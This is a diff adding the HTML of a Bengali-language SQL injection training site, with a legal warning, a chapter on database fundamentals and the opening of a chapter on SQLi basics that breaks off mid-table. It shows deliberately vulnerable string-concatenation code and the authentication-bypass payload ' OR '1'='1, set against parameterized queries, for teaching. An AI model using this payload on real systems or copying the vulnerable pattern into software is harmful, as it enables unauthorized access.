@@ -1,0 +1,2558 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>Learn SQLi</title>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Tiro+Bangla&family=Hind+Siliguri:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+/* ===== Design tokens =====
+   Layout: fixed left sidebar (desktop) / slide-in drawer (mobile) + scrollable content column, sticky topbar with search & controls */
+:root{
+  --bg:#f5f7fa; --surface:#ffffff; --surface-2:#eef1f6; --border:#d9e0e8;
+  --fg:#10151c; --fg-muted:#51607a; --accent:#0f8f82; --accent-fg:#ffffff;
+  --accent-2:#b45309; --danger:#b91c1c; --code-bg:#eef1f5; --code-fg:#1d2733;
+  --link:#0f6f9e; --shadow:0 1px 3px rgba(16,21,28,.08);
+  --font-head:'Tiro Bangla','Noto Serif Bengali',serif;
+  --font-body:'Hind Siliguri','Noto Sans Bengali',sans-serif;
+  --font-mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#0a0e14; --surface:#111722; --surface-2:#161d2a; --border:#263044;
+    --fg:#e7edf5; --fg-muted:#93a3bd; --accent:#2dd4bf; --accent-fg:#06241f;
+    --accent-2:#f5a524; --danger:#ff6b6b; --code-bg:#0d1117; --code-fg:#d7e0ea;
+    --link:#5bc2e8; --shadow:0 1px 3px rgba(0,0,0,.4); color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0a0e14; --surface:#111722; --surface-2:#161d2a; --border:#263044;
+  --fg:#e7edf5; --fg-muted:#93a3bd; --accent:#2dd4bf; --accent-fg:#06241f;
+  --accent-2:#f5a524; --danger:#ff6b6b; --code-bg:#0d1117; --code-fg:#d7e0ea;
+  --link:#5bc2e8; --shadow:0 1px 3px rgba(0,0,0,.4); color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.8;margin:0}
+h1,h2,h3,h4{font-family:var(--font-head);line-height:1.35;text-wrap:balance;color:var(--fg)}
+a{color:var(--link)}
+code,pre{font-family:var(--font-mono)}
+::selection{background:var(--accent);color:var(--accent-fg)}
+
+/* ---- App shell ---- */
+.app{display:flex;min-height:100%}
+.sidebar{
+  width:300px;flex:0 0 300px;background:var(--surface);border-left:1px solid var(--border);
+  padding:16px max(16px,env(safe-area-inset-left,0px)) 24px 16px;position:sticky;top:0;
+  height:100vh;overflow-y:auto;scrollbar-width:thin;
+}
+.brand{display:flex;align-items:center;gap:10px;margin-bottom:6px}
+.brand .mark{width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--link));display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--accent-fg);font-family:var(--font-mono);font-size:14px;flex:none}
+.brand .name{font-family:var(--font-head);font-weight:700;font-size:17px}
+.tagline{font-size:12px;color:var(--fg-muted);margin:0 0 16px}
+.progress-wrap{margin-bottom:14px}
+.progress-bar{height:6px;border-radius:4px;background:var(--surface-2);overflow:hidden;border:1px solid var(--border)}
+.progress-bar>i{display:block;height:100%;background:var(--accent);width:0%}
+.progress-label{font-size:11px;color:var(--fg-muted);margin-top:4px;display:flex;justify-content:space-between}
+.search-box{position:relative;margin-bottom:14px}
+.search-box input{width:100%;padding:9px 32px 9px 10px;border-radius:8px;border:1px solid var(--border);background:var(--surface-2);color:var(--fg);font-family:var(--font-body);font-size:13px}
+.search-box input:focus{outline:2px solid var(--accent);outline-offset:1px}
+.search-box svg{position:absolute;left:8px;top:9px;opacity:.5;pointer-events:none}
+nav.toc{list-style:none;margin:0;padding:0}
+nav.toc .part-label{font-size:11px;letter-spacing:.06em;color:var(--fg-muted);margin:14px 0 4px;padding:0 6px;text-transform:uppercase}
+nav.toc a{display:flex;align-items:center;gap:8px;text-decoration:none;color:var(--fg);padding:7px 8px;border-radius:7px;font-size:13.5px}
+nav.toc a .num{font-family:var(--font-mono);font-size:11px;color:var(--fg-muted);flex:none;width:18px}
+nav.toc a .chk{margin-right:auto;flex:none;width:16px;text-align:center;font-size:12px;color:var(--accent);opacity:0}
+nav.toc a.done .chk{opacity:1}
+nav.toc a:hover{background:var(--surface-2)}
+nav.toc a.active{background:var(--accent);color:var(--accent-fg)}
+nav.toc a.active .num,nav.toc a.active .chk{color:var(--accent-fg)}
+nav.toc a.stub{opacity:.55}
+nav.toc a.stub::after{content:"শীঘ্রই";font-size:10px;margin-right:auto;border:1px solid var(--border);padding:1px 6px;border-radius:999px;color:var(--fg-muted)}
+nav.toc a.hidden-by-search{display:none}
+
+.main{flex:1 1 auto;min-width:0}
+.topbar{
+  position:sticky;top:0;z-index:5;display:flex;align-items:center;gap:10px;
+  background:color-mix(in srgb, var(--bg) 85%, transparent);backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--border);padding:10px max(16px,env(safe-area-inset-right,0px)) 10px max(16px,env(safe-area-inset-left,0px));
+}
+.topbar .title{font-size:13px;color:var(--fg-muted);flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.iconbtn{appearance:none;border:1px solid var(--border);background:var(--surface);color:var(--fg);width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex:none}
+.iconbtn:hover{background:var(--surface-2)}
+.menu-btn{display:none}
+.content{padding:28px max(20px,env(safe-area-inset-right,0px)) 80px max(20px,env(safe-area-inset-left,0px));max-width:820px;margin:0 auto}
+
+.chapter{display:none}
+.chapter.active{display:block;animation:fade .25s ease}
+@keyframes fade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+.chapter > .eyebrow{font-family:var(--font-mono);font-size:12px;color:var(--accent);letter-spacing:.04em}
+.chapter > h1{font-size:30px;margin:4px 0 6px}
+.chapter > .sub{color:var(--fg-muted);font-size:15px;margin:0 0 18px}
+.mark-done-row{display:flex;align-items:center;gap:8px;margin-bottom:24px;font-size:13px;color:var(--fg-muted)}
+.mark-done-row input{width:16px;height:16px;accent-color:var(--accent)}
+
+h2{font-size:22px;margin-top:38px;border-bottom:1px solid var(--border);padding-bottom:8px}
+h3{font-size:17px;margin-top:24px;color:var(--accent)}
+p{margin:12px 0}
+ul,ol{padding-right:22px;padding-left:0;margin:12px 0}
+li{margin:6px 0}
+table{width:100%;border-collapse:collapse;margin:16px 0;font-size:13.5px;display:block;overflow-x:auto;white-space:nowrap}
+table thead{background:var(--surface-2)}
+th,td{border:1px solid var(--border);padding:8px 10px;text-align:right}
+th{font-family:var(--font-head)}
+
+.callout{border-radius:10px;padding:14px 16px;margin:18px 0;border:1px solid var(--border);background:var(--surface);display:flex;gap:10px}
+.callout .ic{flex:none;font-size:16px}
+.callout.warn{border-color:#f5a52455;background:color-mix(in srgb, var(--accent-2) 10%, var(--surface))}
+.callout.danger{border-color:#ef444455;background:color-mix(in srgb, var(--danger) 10%, var(--surface))}
+.callout.info{border-color:#2dd4bf55;background:color-mix(in srgb, var(--accent) 8%, var(--surface))}
+.callout p{margin:0}
+
+.codeblock{position:relative;margin:16px 0;border-radius:10px;overflow:hidden;border:1px solid var(--border)}
+.codeblock .cb-head{display:flex;justify-content:space-between;align-items:center;background:var(--surface-2);padding:6px 10px;font-size:11px;color:var(--fg-muted);font-family:var(--font-mono)}
+.codeblock pre{margin:0;padding:14px;background:var(--code-bg);color:var(--code-fg);overflow-x:auto;font-size:13px;line-height:1.6}
+.copy-btn{appearance:none;border:1px solid var(--border);background:var(--surface);color:var(--fg);font-size:11px;padding:3px 9px;border-radius:6px;cursor:pointer;font-family:var(--font-body)}
+.copy-btn:hover{background:var(--accent);color:var(--accent-fg);border-color:var(--accent)}
+.tok-kw{color:#c678dd}.tok-str{color:#98c379}.tok-com{color:#7f8ea3;font-style:italic}.tok-num{color:#d19a66}
+
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media (max-width:700px){.grid2{grid-template-columns:1fr}}
+.card{border:1px solid var(--border);border-radius:10px;padding:14px;background:var(--surface)}
+.card h4{margin:0 0 8px;font-size:14px}
+.tag{display:inline-block;font-size:11px;border:1px solid var(--border);border-radius:999px;padding:2px 9px;margin:0 4px 4px 0;color:var(--fg-muted);font-family:var(--font-mono)}
+
+details{border:1px solid var(--border);border-radius:10px;margin:14px 0;background:var(--surface)}
+details summary{cursor:pointer;padding:12px 14px;font-weight:600;list-style:none}
+details summary::-webkit-details-marker{display:none}
+details summary::before{content:"▸ ";color:var(--accent)}
+details[open] summary::before{content:"▾ "}
+details .inner{padding:0 14px 14px}
+
+.exercise{border:1px dashed var(--accent);border-radius:10px;padding:14px 16px;margin:18px 0;background:color-mix(in srgb, var(--accent) 6%, var(--surface))}
+.exercise h4{margin:0 0 6px;font-size:14px;color:var(--accent)}
+
+.qa{border-top:1px dashed var(--border);margin-top:28px;padding-top:14px}
+.qa ol{padding-right:20px}
+
+.summary-box{background:var(--surface-2);border-radius:10px;padding:14px 16px;margin:26px 0;border:1px solid var(--border)}
+.summary-box h4{margin:0 0 6px;font-size:13px;color:var(--fg-muted);text-transform:uppercase;letter-spacing:.04em;font-family:var(--font-body)}
+
+.pager{display:flex;justify-content:space-between;gap:12px;margin-top:40px;border-top:1px solid var(--border);padding-top:18px}
+.pager a{flex:1;border:1px solid var(--border);border-radius:10px;padding:12px 14px;text-decoration:none;color:var(--fg);font-size:13px;background:var(--surface)}
+.pager a:hover{border-color:var(--accent)}
+.pager a span{display:block;color:var(--fg-muted);font-size:11px;margin-bottom:2px}
+.pager a.next{text-align:left}
+.pager a.prev{text-align:right}
+
+.stub-box{border:1px dashed var(--border);border-radius:12px;padding:30px;text-align:center;color:var(--fg-muted);margin-top:20px}
+
+@media (max-width:860px) {
+  .topbar .menu-btn {
+    order: 10;
+  }
+
+  .topbar .title {
+    order: 1;
+  }
+
+  .topbar #themeBtn {
+    order: 2;
+  }
+
+  .topbar #printBtn {
+    order: 3;
+  }
+}
+@media print{
+  .sidebar,.topbar,.pager,.copy-btn,.mark-done-row{display:none !important}
+  .chapter{display:block !important}
+  .content{max-width:100%}
+  body{background:#fff;color:#000}
+}
+.search-box {
+  display: none !important;
+}
+</style>
+
+<div class="app">
+  <div class="scrim" id="scrim"></div>
+  <aside class="sidebar" id="sidebar">
+    <div class="brand"><div class="mark">SQL</div><div class="name">SQLi শিক্ষাঙ্গন</div></div>
+    <p class="tagline">বাংলায় সম্পূর্ণ SQL Injection গাইড — fundamentals থেকে bug-bounty reporting পর্যন্ত</p>
+    <div class="progress-wrap">
+      <div class="progress-bar"><i id="progressFill"></i></div>
+      <div class="progress-label"><span id="progressText">০/২২ অধ্যায় সম্পন্ন</span><span>পড়ার অগ্রগতি</span></div>
+    </div>
+    <div class="search-box">
+       <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
+      <input id="searchInput" type="text" placeholder="অধ্যায় খুঁজুন…"> </div>
+    <ul class="toc" id="toc" style="list-style:none;padding:0;margin:0"></ul>
+  </aside>
+
+  <div class="main">
+    <div class="topbar">
+      <button class="iconbtn menu-btn" id="menuBtn" aria-label="মেনু">☰</button>
+      <div class="title" id="topTitle">ভূমিকা</div>
+      <button class="iconbtn" id="themeBtn" aria-label="থিম পরিবর্তন" title="ডার্ক/লাইট">◐</button>
+      <button class="iconbtn" id="printBtn" aria-label="প্রিন্ট" title="প্রিন্ট-ফ্রেন্ডলি ভিউ">⎙</button>
+    </div>
+    <div class="content" id="content"><section class="chapter active" id="ch00">
+  <div class="eyebrow">শুরু করার আগে</div>
+  <h1>SQLi শিক্ষাঙ্গনে স্বাগতম</h1>
+  <p class="sub">সম্পূর্ণ বাংলায় SQL Injection শেখার একটি কাঠামোবদ্ধ, practical রিসোর্স — fundamentals থেকে শুরু করে bug-bounty report লেখা পর্যন্ত।</p>
+
+  <div class="callout danger">
+    <div class="ic">⚠️</div>
+    <p><strong>আইনি ও নৈতিক সীমারেখা:</strong> এই পুরো ডকুমেন্টেশনের কোনো payload, technique বা methodology কখনোই এমন কোনো সিস্টেমে প্রয়োগ করবেন না যার জন্য আপনার লিখিত/স্পষ্ট অনুমতি নেই। শুধুমাত্র নিজের তৈরি করা lab, অনুমোদিত training environment (যেমন PortSwigger Web Security Academy, OWASP Juice Shop) অথবা স্পষ্টভাবে scope-এ থাকা bug-bounty target-এ practice করুন। অননুমোদিত সিস্টেমে টেস্টিং করা অপরাধ এবং এটি Computer Fraud and Abuse Act-এর মতো আইনের আওতায় পড়তে পারে।</p>
+  </div>
+
+  <h2>এই ডকুমেন্টেশন কীভাবে ব্যবহার করবেন</h2>
+  <p>বাম পাশের sidebar থেকে যেকোনো অধ্যায়ে যেতে পারবেন। প্রতিটি অধ্যায়ের উপরে একটি "এই অধ্যায় সম্পন্ন" চেকবক্স আছে — টিক দিলে sidebar-এ progress bar আপডেট হবে এবং browser-এ স্থানীয়ভাবে সংরক্ষিত থাকবে। প্রতিটি code/payload ব্লকের পাশে একটি "কপি" বাটন আছে।</p>
+
+  <h3>Learning path</h3>
+  <div class="grid2">
+    <div class="card"><h4>🟢 Beginner</h4><p>অধ্যায় ১–৩, ৬, ৯–১১, ১৭ — SQL ও SQLi-এর ভিত্তি, major types, manual testing-এর basic ধাপ, prevention।</p></div>
+    <div class="card"><h4>🟡 Intermediate</h4><p>অধ্যায় ৪–৮, ১৩–১৪, ১৮–১৯ — কোথায় টেস্ট করতে হয়, payload handbook, Burp Suite, fingerprinting, reporting।</p></div>
+    <div class="card"><h4>🔴 Advanced</h4><p>অধ্যায় ১২, ১৫–১৬, ২০–২২ — WAF bypass research, automation, impact assessment, labs ও assessment।</p></div>
+  </div>
+
+  <h3>Project status</h3>
+  <p>এই ডকুমেন্টেশনের সবগুলো ২২টি অধ্যায় সম্পূর্ণ লেখা আছে | Fundamentals থেকে শুরু করে প্রতিটি প্রধান SQLi ধরন, টেস্টিং methodology, prevention, এবং bug-bounty reporting পর্যন্ত। প্রতিটি অধ্যায়ের উপরের চেকবক্সে টিক দিয়ে নিজের পড়ার অগ্রগতি ট্র্যাক করতে পারবেন।</p>
+  
+  <div class="pager">
+  <a class="next" href="/chapter01"><span>পরবর্তী</span>অধ্যায় ০১ · ভিত্তি </a>
+
+</section>
+
+<!-- =========================================================
+     CHAPTER 1
+========================================================= -->
+<section class="chapter" id="ch01">
+  <div class="eyebrow">অধ্যায় ০১ · ভিত্তি</div>
+  <h1>SQL ও Database Fundamentals</h1>
+  <p class="sub">SQL Injection বোঝার আগে database ও SQL query কীভাবে কাজ করে তা স্পষ্টভাবে জানা জরুরি।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch01" id="done-ch01"><label for="done-ch01">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Database কী এবং কেন ব্যবহার করা হয়?</h2>
+  <p><strong>সংজ্ঞা:</strong> Database হলো তথ্য সংরক্ষণ করার একটি সুসংগঠিত ব্যবস্থা, যেখানে ডেটা এমনভাবে রাখা হয় যাতে পরবর্তীতে সহজে খোঁজা (query), যোগ করা, পরিবর্তন করা বা মোছা যায়। একটি ই-কমার্স সাইটের ইউজার তথ্য, প্রোডাক্ট তালিকা, অর্ডার হিস্ট্রি — সবকিছুই database-এ থাকে।</p>
+  <p><strong>কেন গুরুত্বপূর্ণ:</strong> ওয়েব অ্যাপ্লিকেশনের প্রায় প্রতিটি ফিচার — লগইন, সার্চ, প্রোডাক্ট দেখা, অর্ডার দেওয়া — আসলে ভেতরে ভেতরে database query চালিয়ে কাজ করে। SQL Injection ঠিক এই query তৈরির প্রক্রিয়াতেই আক্রমণ করে, তাই database কীভাবে কাজ করে না বুঝলে SQLi বোঝা সম্ভব না।</p>
+
+  <h3>Relational Database ও SQL</h3>
+  <p>আমরা মূলত <strong>Relational Database Management System (RDBMS)</strong> নিয়ে কথা বলব — যেমন MySQL, PostgreSQL, Microsoft SQL Server, Oracle, SQLite। এই সিস্টেমগুলোতে ডেটা থাকে <strong>table</strong> আকারে, যা অনেকটা স্প্রেডশিটের মতো — সারি (row) ও কলাম (column) দিয়ে গঠিত।</p>
+  <ul>
+    <li><strong>Table:</strong> একধরনের সম্পর্কিত ডেটার সংগ্রহ, যেমন <code>users</code> টেবিল।</li>
+    <li><strong>Row (record):</strong> একটি একক এন্ট্রি, যেমন একজন নির্দিষ্ট ইউজার।</li>
+    <li><strong>Column (field):</strong> একটি নির্দিষ্ট বৈশিষ্ট্য, যেমন <code>username</code>, <code>email</code>, <code>password_hash</code>।</li>
+    <li><strong>Schema:</strong> একটি database-এর সামগ্রিক কাঠামো — কোন কোন টেবিল আছে, তাদের কলাম কী কী, এবং তাদের মধ্যে সম্পর্ক কী।</li>
+  </ul>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>users টেবিল — উদাহরণ</span></div>
+    <pre><code>id | username   | email                | role
+---|------------|----------------------|-------
+1  | alamin     | alamin@example.com   | admin
+2  | rahim      | rahim@example.com    | user
+3  | karim      | karim@example.com    | user</code></pre>
+  </div>
+
+  <h3>SQL কী?</h3>
+  <p><strong>SQL (Structured Query Language)</strong> হলো এমন একটি ভাষা যা দিয়ে আমরা relational database-এর সাথে "কথা বলি" — ডেটা জিজ্ঞাসা করি, যোগ করি, পরিবর্তন করি বা মুছি। এটি প্রোগ্রামিং ভাষার মতো loop/function-ভিত্তিক নয়; বরং এটি declarative — আমরা বলি "আমার কী দরকার", আর database ইঞ্জিন ঠিক করে "কীভাবে সেটা আনা হবে"।</p>
+
+  <h3>প্রধান SQL কমান্ডগুলো</h3>
+  <div class="codeblock">
+    <div class="cb-head"><span>SELECT — ডেটা পড়া</span><button class="copy-btn">কপি</button></div>
+    <pre><code>SELECT username, email FROM users WHERE role = 'admin';</code></pre>
+  </div>
+  <p>এই query-টি <code>users</code> টেবিল থেকে সেই সব সারির <code>username</code> ও <code>email</code> দেখাবে যাদের <code>role</code>-এর মান <code>'admin'</code>। <code>WHERE</code> clause একটি শর্ত নির্ধারণ করে — শুধু সেই শর্ত সত্য হলে সারিটি ফলাফলে আসবে।</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>INSERT, UPDATE, DELETE</span><button class="copy-btn">কপি</button></div>
+    <pre><code>-- নতুন রেকর্ড যোগ করা
+INSERT INTO users (username, email, role) VALUES ('nayeem', 'nayeem@example.com', 'user');
+
+-- বিদ্যমান রেকর্ড পরিবর্তন করা
+UPDATE users SET role = 'admin' WHERE username = 'nayeem';
+
+-- রেকর্ড মুছে ফেলা
+DELETE FROM users WHERE username = 'nayeem';</code></pre>
+  </div>
+  <p><code>ORDER BY</code> ফলাফলকে সাজায় (যেমন দামের ভিত্তিতে ascending/descending), আর <code>GROUP BY</code> একই মানবিশিষ্ট সারিগুলোকে একত্র করে সংক্ষিপ্ত হিসাব (যেমন count, sum) তৈরি করতে ব্যবহৃত হয়। <code>JOIN</code> দিয়ে একাধিক টেবিলের ডেটা একসাথে যুক্ত করে দেখা যায় — যেমন <code>orders</code> টেবিলের সাথে <code>users</code> টেবিল জোড়া দিয়ে "কোন ইউজার কী অর্ডার করেছে" বের করা।</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>JOIN উদাহরণ</span><button class="copy-btn">কপি</button></div>
+    <pre><code>SELECT users.username, orders.product_name
+FROM orders
+JOIN users ON orders.user_id = users.id
+WHERE orders.status = 'shipped';</code></pre>
+  </div>
+
+  <h3>Primary Key, Foreign Key ও Relationship</h3>
+  <p><strong>Primary key</strong> হলো একটি টেবিলের প্রতিটি সারিকে অদ্বিতীয়ভাবে চেনার জন্য একটি কলাম (যেমন <code>id</code>)। <strong>Foreign key</strong> হলো একটি টেবিলের কলাম যা অন্য টেবিলের primary key-কে নির্দেশ করে — এভাবেই টেবিলগুলোর মধ্যে সম্পর্ক (relationship) তৈরি হয়। যেমন <code>orders.user_id</code> আসলে <code>users.id</code>-কে নির্দেশ করে, অর্থাৎ প্রতিটি অর্ডার একজন নির্দিষ্ট ইউজারের সাথে যুক্ত।</p>
+
+  <h3>Data Types</h3>
+  <table>
+    <thead><tr><th>Type</th><th>উদাহরণ</th><th>ব্যাখ্যা</th></tr></thead>
+    <tbody>
+      <tr><td>Integer</td><td><code>42</code></td><td>পূর্ণসংখ্যা; quote ছাড়া লেখা হয়</td></tr>
+      <tr><td>String / Varchar</td><td><code>'alamin'</code></td><td>টেক্সট; সাধারণত single quote দিয়ে ঘেরা থাকে</td></tr>
+      <tr><td>Boolean</td><td><code>TRUE</code>/<code>FALSE</code></td><td>সত্য/মিথ্যা মান (সব DB-তে নেই)</td></tr>
+      <tr><td>NULL</td><td><code>NULL</code></td><td>"কোনো মান নেই" বোঝায়, খালি স্ট্রিং থেকে আলাদা</td></tr>
+      <tr><td>Date/Time</td><td><code>'2026-01-15'</code></td><td>তারিখ ও সময়</td></tr>
+    </tbody>
+  </table>
+  <p>SQL Injection বোঝার জন্য সবচেয়ে গুরুত্বপূর্ণ বিষয় হলো — <strong>string value সাধারণত quote দিয়ে ঘেরা থাকে, কিন্তু integer থাকে না।</strong> এই পার্থক্যটাই পরবর্তী অধ্যায়ে injection-এর মূল ভিত্তি হয়ে দাঁড়াবে।</p>
+
+  <h2>Web Application কীভাবে User Input থেকে SQL Query তৈরি করে</h2>
+  <p>একটি সাধারণ লগইন ফর্মের কথা চিন্তা করুন। ইউজার username ও password দেয়, আর backend কোড (PHP, Python, Node.js, Java ইত্যাদি) সেই input নিয়ে একটি SQL query তৈরি করে database-এ পাঠায়:</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>ধারণাগত উদাহরণ (যেকোনো ভাষায়)</span><button class="copy-btn">কপি</button></div>
+    <pre><code>username = "alamin"        // user input
+password = "mypassword123" // user input
+
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+// ফলাফল: SELECT * FROM users WHERE username = 'alamin' AND password = 'mypassword123'</code></pre>
+  </div>
+  <p>লক্ষ্য করুন — এখানে ইউজারের দেওয়া টেক্সট সরাসরি SQL query-এর ভেতরে "বসিয়ে দেওয়া" হচ্ছে, string concatenation (জোড়া লাগানো) দিয়ে। এটাই হলো সেই pattern, যেখানে যদি ইউজার normal টেক্সটের বদলে বিশেষভাবে তৈরি করা টেক্সট (payload) পাঠায়, তাহলে query-এর অর্থ পুরোপুরি বদলে যেতে পারে — এটাই SQL Injection-এর মূল ভিত্তি, যা অধ্যায় ২-এ বিস্তারিতভাবে দেখব।</p>
+
+  <h3>Frontend, Backend, Application Server ও Database-এর ভূমিকা</h3>
+  <ul>
+    <li><strong>Frontend:</strong> ব্রাউজারে যা দেখা যায় — ফর্ম, বাটন। এখানে client-side validation (যেমন JavaScript দিয়ে ইমেইল ফরম্যাট চেক) থাকতে পারে, কিন্তু এটি কখনোই নিরাপত্তার মূল স্তর নয় — attacker সরাসরি HTTP request পাঠিয়ে frontend সম্পূর্ণ বাইপাস করতে পারে।</li>
+    <li><strong>Backend / Application Server:</strong> ইউজারের input গ্রহণ করে, business logic চালায়, এবং database query তৈরি করে পাঠায়।</li>
+    <li><strong>Database:</strong> query গ্রহণ করে, তা execute করে, এবং ফলাফল ফেরত পাঠায়।</li>
+  </ul>
+  <p>SQL Injection ঘটে যখন backend ইউজারের input-কে "ডেটা" হিসেবে না রেখে ভুলভাবে "কোডের অংশ" (query syntax-এর অংশ) হয়ে উঠতে দেয়।</p>
+
+  <h3>Authentication ও Authorization-এর সঙ্গে Database-এর সম্পর্ক</h3>
+  <p><strong>Authentication</strong> (পরিচয় যাচাই) সাধারণত একটি query দিয়ে হয় — ইউজারনেম ও পাসওয়ার্ড (hash আকারে) database-এর সাথে মিলিয়ে দেখা হয়। <strong>Authorization</strong> (অনুমতি যাচাই) নির্ধারণ করে একজন লগইন করা ইউজার কী কী করতে পারবে — এটিও প্রায়ই database-এ থাকা <code>role</code> বা <code>permission</code> কলামের উপর নির্ভর করে। যেহেতু এই দুটিই query-নির্ভর, তাই SQL Injection দিয়ে এই দুটোকেই বিপর্যস্ত করা সম্ভব — যা অধ্যায় ১৩-এ বিস্তারিতভাবে আলোচনা হবে।</p>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>নিচের query-টি দেখুন এবং চিন্তা করুন — যদি ইউজার <code>username</code> ফিল্ডে এমন কিছু লেখে যাতে একটি single quote (<code>'</code>) থাকে, তাহলে query-এর গঠনে কী পরিবর্তন আসতে পারে?</p>
+    <div class="codeblock"><pre><code>SELECT * FROM users WHERE username = '&lt;INPUT&gt;'</code></pre></div>
+    <p>পরের অধ্যায়ে এর বিস্তারিত উত্তর পাবেন।</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>Database তথ্য সংরক্ষণ করে table/row/column আকারে; SQL দিয়ে সেই তথ্য জিজ্ঞাসা/পরিবর্তন করা হয়; ওয়েব অ্যাপ প্রায়ই ইউজার input-কে সরাসরি query-তে জোড়া লাগিয়ে (string concatenation) query তৈরি করে — এই অভ্যাসটিই SQL Injection-এর মূল কারণ, যা পরের অধ্যায়ে বিস্তারিতভাবে আলোচিত হবে।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>Primary key ও foreign key-এর মধ্যে পার্থক্য কী?</li>
+      <li>String ও integer value-এর মধ্যে quote ব্যবহারে পার্থক্য কেন গুরুত্বপূর্ণ?</li>
+      <li>Client-side validation কেন নিরাপত্তার মূল স্তর হতে পারে না?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/"><span>পূর্ববর্তী</span>ভূমিকা</a>
+    <a class="next" href="/chapter02"><span>পরবর্তী</span>অধ্যায় ০২ — SQL Injection Fundamentals</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 2
+========================================================= -->
+<section class="chapter" id="ch02">
+  <div class="eyebrow">অধ্যায় ০২ · ভিত্তি</div>
+  <h1>SQL Injection Fundamentals</h1>
+  <p class="sub">SQL Injection কী, কেন ঘটে, এবং কীভাবে এটি অন্যান্য vulnerability থেকে আলাদা।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch02" id="done-ch02"><label for="done-ch02">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>SQL Injection কী?</h2>
+  <p><strong>সংজ্ঞা:</strong> SQL Injection (SQLi) হলো একটি ওয়েব অ্যাপ্লিকেশন সিকিউরিটি vulnerability, যেখানে attacker ইউজার-ইনপুট ফিল্ডের মাধ্যমে এমন টেক্সট পাঠায় যা backend-এ তৈরি হওয়া SQL query-এর গঠন (structure) পরিবর্তন করে দেয়। ফলে database এমন কাজ করতে বাধ্য হয় যা application developer কখনো চাননি — যেমন authentication বাইপাস করা, গোপন ডেটা বের করে আনা, ডেটা পরিবর্তন/মোছা, বা কিছু ক্ষেত্রে পুরো সার্ভার নিয়ন্ত্রণে নেওয়ার পথ তৈরি হওয়া।</p>
+
+  <h2>SQLi কেন এবং কীভাবে তৈরি হয়?</h2>
+  <p>অধ্যায় ১-এ দেখেছি, backend প্রায়ই string concatenation দিয়ে query বানায়:</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>Vulnerable কোড (ধারণাগত)</span><button class="copy-btn">কপি</button></div>
+    <pre><code>query = "SELECT * FROM users WHERE username = '" + input + "'"</code></pre>
+  </div>
+  <p>যদি স্বাভাবিক ইউজার <code>alamin</code> লেখে, তাহলে query হয়:</p>
+  <div class="codeblock"><pre><code>SELECT * FROM users WHERE username = 'alamin'</code></pre></div>
+  <p>কিন্তু যদি attacker input হিসেবে <code>' OR '1'='1</code> পাঠায়, তাহলে query হয়ে যায়:</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>Injected query</span><button class="copy-btn">কপি</button></div>
+    <pre><code>SELECT * FROM users WHERE username = '' OR '1'='1'</code></pre>
+  </div>
+  <p><strong>কী ঘটল:</strong> attacker-এর দেওয়া single quote (<code>'</code>) আগের string literal বন্ধ করে দিল, এরপর <code>OR '1'='1'</code> যোগ হলো — যা সবসময় <strong>true</strong>, কারণ <code>'1'='1'</code> সবসময় সত্য। ফলে <code>WHERE</code> শর্ত সবসময় সত্য হয়ে যায়, এবং query টেবিলের সব সারি ফেরত দেয় — username যাচাই না করেই। এই নির্দিষ্ট প্যাটার্নটি প্রায়ই authentication বাইপাসের ক্লাসিক উদাহরণ হিসেবে দেখানো হয়, কিন্তু মনে রাখবেন, বাস্তব application-এর exact আচরণ framework, error handling ও query-এর গঠনের উপর নির্ভর করে।</p>
+
+  <h3>Vulnerable বনাম Secure Query</h3>
+  <table>
+    <thead><tr><th>ধরন</th><th>কোড</th><th>সমস্যা</th></tr></thead>
+    <tbody>
+      <tr><td>Vulnerable</td><td><code>"...WHERE id = " + userInput</code></td><td>Input সরাসরি query string-এ জোড়া লাগানো</td></tr>
+      <tr><td>Secure</td><td><code>"...WHERE id = ?"</code> + parameter bind</td><td>Input কে ডেটা হিসেবে আলাদাভাবে পাঠানো হয়, কখনো কোড হিসেবে parse হয় না</td></tr>
